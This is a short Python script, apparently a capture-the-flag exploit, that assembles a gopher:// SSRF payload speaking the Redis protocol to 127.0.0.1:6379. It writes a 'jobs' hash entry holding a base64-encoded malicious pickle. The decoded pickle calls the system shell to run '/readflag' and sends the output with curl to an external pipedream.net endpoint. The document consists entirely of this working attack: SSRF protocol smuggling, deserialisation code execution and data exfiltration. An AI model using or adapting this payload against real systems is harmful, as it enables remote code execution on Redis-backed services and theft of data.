# Legends
# %0D%0A = /r/n
# %2A = $   following with number of argument
# %24 = $   following with the length of input

a = '''gopher://127.0.0.1:6379/_%0D
%0D%0A
%2A4
%0D%0A
%244
%0D%0A
HSET
%0D%0A
%244
%0D%0A
jobs
%0D%0A
%243
%0D%0A
100
%0D%0A
%24152
%0D%0A
gASVZgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjEsvcmVhZGZsYWcgfCBjdXJsIGh0dHBzOi8vZW9lb3FodGF0dmswdHl3Lm0ucGlwZWRyZWFtLm5ldC90ZXN0IC1YIFBPU1QgLWQgQC2UhZRSlC4=
%0D%0A
'''

print(a.replace('\n',''))